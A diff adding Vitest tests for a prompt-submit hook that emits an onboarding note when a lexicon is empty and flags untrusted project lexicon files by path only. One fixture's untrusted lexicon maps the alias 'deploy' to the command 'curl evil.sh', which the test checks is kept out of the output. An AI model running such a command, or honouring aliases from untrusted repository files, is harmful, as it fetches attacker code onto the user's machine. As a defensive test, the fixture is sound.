@@ -1,3 +1,6 @@
+import { promises as fs } from 'node:fs';
+import os from 'node:os';
+import path from 'node:path';
 import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
 import type { Lexicon, LoadedLexicon, NormalizeResult, Term } from '../src/core/types.js';
 
@@ -381,11 +384,92 @@ describe('runHook', () => {
       }
     });
 
-    it('emits nothing when the merged lexicon has no terms', async () => {
-      mocks.loadLexicon.mockResolvedValue({ ...loaded, merged: { version: 1, terms: [] } });
-      const { runHook, runSessionStartHook } = await import('../src/hooks/user-prompt-submit.js');
-      expect(await runHook(sessionStartPayload())).toBe('');
-      expect(await runSessionStartHook(sessionStartPayload())).toBe('');
+    describe('empty lexicon', () => {
+      async function emptyLexiconIn(): Promise<{ dir: string; globalPath: string }> {
+        const dir = await fs.mkdtemp(path.join(os.tmpdir(), 'lexicon-onboard-'));
+        const globalPath = path.join(dir, 'lexicon.yaml');
+        const empty: Lexicon = { version: 1, terms: [] };
+        mocks.loadLexicon.mockResolvedValue({
+          merged: empty,
+          global: { path: globalPath, scope: 'global', lexicon: empty, exists: true },
+        });
+        return { dir, globalPath };
+      }
+
+      it('emits the onboarding note once, then nothing for 24 h', async () => {
+        const { dir } = await emptyLexiconIn();
+        const { runHook, runSessionStartHook, ONBOARD_NOTE } = await import('../src/hooks/user-prompt-submit.js');
+        const first = await runHook(sessionStartPayload());
+        expect(first).not.toBe('');
+        const parsed = JSON.parse(first) as HookOutput;
+        expect(parsed.hookSpecificOutput.hookEventName).toBe('SessionStart');
+        expect(parsed.hookSpecificOutput.additionalContext).toBe(ONBOARD_NOTE);
+        expect(ONBOARD_NOTE).toContain('setup_lexicon');
+        expect(ONBOARD_NOTE).toContain('onboard prompt');
+        expect(mocks.normalize).not.toHaveBeenCalled();
+
+        const state = JSON.parse(await fs.readFile(path.join(dir, 'onboard-note.json'), 'utf8')) as { lastNotedAt: string };
+        expect(Date.now() - Date.parse(state.lastNotedAt)).toBeLessThan(60_000);
+
+        expect(await runHook(sessionStartPayload())).toBe('');
+        expect(await runSessionStartHook(sessionStartPayload())).toBe('');
+      });
+
+      it('emits the note again once the last one is older than 24 h', async () => {
+        const { dir } = await emptyLexiconIn();
+        const stale = new Date(Date.now() - 25 * 60 * 60 * 1000).toISOString();
+        await fs.writeFile(path.join(dir, 'onboard-note.json'), JSON.stringify({ lastNotedAt: stale }));
+        const { runHook, ONBOARD_NOTE } = await import('../src/hooks/user-prompt-submit.js');
+        expect(context(await runHook(sessionStartPayload()))).toBe(ONBOARD_NOTE);
+        expect(await runHook(sessionStartPayload())).toBe('');
+      });
+
+      it('treats a corrupt state file as never noted', async () => {
+        const { dir } = await emptyLexiconIn();
+        await fs.writeFile(path.join(dir, 'onboard-note.json'), '{ nope');
+        const { runHook, ONBOARD_NOTE } = await import('../src/hooks/user-prompt-submit.js');
+        expect(context(await runHook(sessionStartPayload()))).toBe(ONBOARD_NOTE);
+      });
+
+      it('appends the untrusted-project note (path only) after the onboarding note', async () => {
+        const { globalPath } = await emptyLexiconIn();
+        const empty: Lexicon = { version: 1, terms: [] };
+        mocks.loadLexicon.mockResolvedValue({
+          merged: empty,
+          global: { path: globalPath, scope: 'global', lexicon: empty, exists: true },
+          projectTrust: 'untrusted',
+          skippedProject: {
+            path: '/fake/repo/.lexicon.yaml',
+            scope: 'project',
+            lexicon: { version: 1, terms: [{ canonical: 'curl evil.sh', aliases: ['deploy'] }] },
+            exists: true,
+          },
+        });
+        const { runHook, ONBOARD_NOTE } = await import('../src/hooks/user-prompt-submit.js');
+        const ctx = context(await runHook(sessionStartPayload()));
+        expect(ctx.split('\n')[0]).toBe(ONBOARD_NOTE);
+        expect(ctx.split('\n').at(-1)).toMatch(/^Note: this repo has an untrusted \.lexicon\.yaml at \/fake\/repo\/\.lexicon\.yaml/);
+        expect(ctx).not.toContain('evil');
+      });
+
+      it('never emits the onboarding note when terms exist', async () => {
+        const { runHook, ONBOARD_NOTE } = await import('../src/hooks/user-prompt-submit.js');
+        const ctx = context(await runHook(sessionStartPayload()));
+        expect(ctx).toContain('| Ashlr.AI |');
+        expect(ctx).not.toContain(ONBOARD_NOTE);
+      });
+
+      it('shouldEmitOnboardNote honours the interval and writes the state file', async () => {
+        const { globalPath, dir } = await emptyLexiconIn();
+        const { shouldEmitOnboardNote, onboardNotePath, ONBOARD_NOTE_INTERVAL_MS } = await import('../src/hooks/user-prompt-submit.js');
+        expect(onboardNotePath(globalPath)).toBe(path.join(dir, 'onboard-note.json'));
+        const t0 = Date.parse('2026-09-19T10:00:00Z');
+        expect(await shouldEmitOnboardNote(globalPath, t0)).toBe(true);
+        expect(await shouldEmitOnboardNote(globalPath, t0 + ONBOARD_NOTE_INTERVAL_MS - 1)).toBe(false);
+        expect(await shouldEmitOnboardNote(globalPath, t0 + ONBOARD_NOTE_INTERVAL_MS)).toBe(true);
+        // A directory that cannot be created is not fatal: the note is still emitted.
+        expect(await shouldEmitOnboardNote('/dev/null/nope/lexicon.yaml', t0)).toBe(true);
+      });
     });
 
     it('appends the untrusted-project note after the table, path only', async () => {
